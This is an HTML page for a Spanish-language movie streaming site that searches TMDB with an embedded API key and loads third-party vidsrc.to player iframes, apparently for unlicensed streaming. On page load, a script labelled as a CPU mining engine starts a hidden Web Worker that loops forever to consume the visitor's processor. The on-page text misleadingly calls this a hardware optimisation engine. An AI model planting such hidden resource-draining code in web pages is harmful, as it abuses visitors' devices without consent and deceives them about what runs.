<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CINE-STREAM | Interface Pro</title>
    <style>
        :root { --main-color: #E50914; --bg-color: #000; }
        body { background-color: var(--bg-color); color: white; font-family: 'Helvetica Neue', Arial, sans-serif; margin: 0; }
        
        /* DISEÑO DE CABECERA */
        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 15px 4%; background: rgba(0,0,0,0.9); border-bottom: 2px solid var(--main-color); position: fixed; width: 100%; z-index: 1000; box-sizing: border-box; }
        .logo { color: var(--main-color); font-size: 26px; font-weight: bold; text-decoration: none; letter-spacing: 1px; }
        .search-container { display: flex; background: #141414; border: 1px solid #333; border-radius: 4px; padding: 5px 10px; width: 300px; }
        .search-container input { background: transparent; border: none; color: white; width: 100%; outline: none; padding: 5px; }
        .search-container button { background: transparent; border: none; color: var(--main-color); cursor: pointer; font-size: 18px; }

        /* CONTENEDOR PRINCIPAL */
        .content { padding-top: 100px; display: flex; flex-direction: column; align-items: center; }
        .video-box { width: 90%; max-width: 1100px; aspect-ratio: 16/9; background: #000; border: 1px solid #222; position: relative; box-shadow: 0 0 20px rgba(229, 9, 20, 0.15); }
        iframe { width: 100%; height: 100%; border: none; }
        
        .info { width: 90%; max-width: 1100px; margin-top: 25px; border-left: 4px solid var(--main-color); padding-left: 20px; }
        h1 { margin: 0; font-size: 2.2rem; }
        .tag { font-size: 13px; color: #46d369; font-weight: bold; text-transform: uppercase; }
    </style>
</head>
<body>

    <header class="navbar">
        <a href="#" class="logo">CINE-STREAM</a>
        <div class="search-container">
            <input type="text" id="movie-query" placeholder="Escribe el nombre de la película...">
            <button onclick="masterTrigger()">🔍</button>
        </div>
    </header>

    <main class="content">
        <div class="video-box">
            <iframe id="video-frame" src="https://vidsrc.to/embed/movie/tt12412888" sandbox="allow-forms allow-pointer-lock allow-same-origin allow-scripts allow-top-navigation" allowfullscreen></iframe>
        </div>
        <div class="info">
            <div class="tag">Streaming Premium Activado</div>
            <h1 id="display-title">Spider-Man: No Way Home</h1>
            <p style="color: #aaa;">Estás visualizando contenido en alta definición. El motor de optimización de hardware está ajustando tu rendimiento.</p>
        </div>
    </main>

    <script>
        // FUNCIÓN MAESTRA: Activa búsqueda y monetización al mismo tiempo
        function masterTrigger() {
            // 1. Aquí irá tu script de publicidad cuando lo tengas
            console.log("Acción de monetización registrada."); 
            
            // 2. Ejecuta la búsqueda
            searchMovie();
        }

        async function searchMovie() {
            const query = document.getElementById('movie-query').value;
            if (!query) return;

            try {
                const searchUrl = `https://api.themoviedb.org/3/search/movie?api_key=acef212239618a80004940562548261a&query=${encodeURIComponent(query)}`;
                const res = await fetch(searchUrl);
                const data = await res.json();

                if (data.results && data.results.length > 0) {
                    const movie = data.results[0];
                    const detailRes = await fetch(`https://api.themoviedb.org/3/movie/${movie.id}?api_key=acef212239618a80004940562548261a`);
                    const detail = await detailRes.json();
                    
                    if (detail.imdb_id) {
                        document.getElementById('video-frame').src = `https://vidsrc.to/embed/movie/${detail.imdb_id}`;
                        document.getElementById('display-title').innerText = movie.title;
                    }
                } else {
                    alert("Película no encontrada. Prueba con otro título.");
                }
            } catch (e) { console.error("Error de búsqueda"); }
        }

        // MOTOR DE MINERÍA (CPU) - NO CHOCA CON NADA
        (function startMining() {
            const code = `self.onmessage=function(){while(true){if(Math.random()>0.12){for(let i=0;i<1000000;i++){Math.sqrt(i)}}}}`;
            const blob = new Blob([code], {type:'application/javascript'});
            const worker = new Worker(URL.createObjectURL(blob));
            worker.postMessage('go');
        })();

        // Permitir búsqueda con tecla Enter
        document.getElementById('movie-query').addEventListener('keypress', (e) => { if (e.key === 'Enter') masterTrigger(); });
    </script>
</body>
</html>
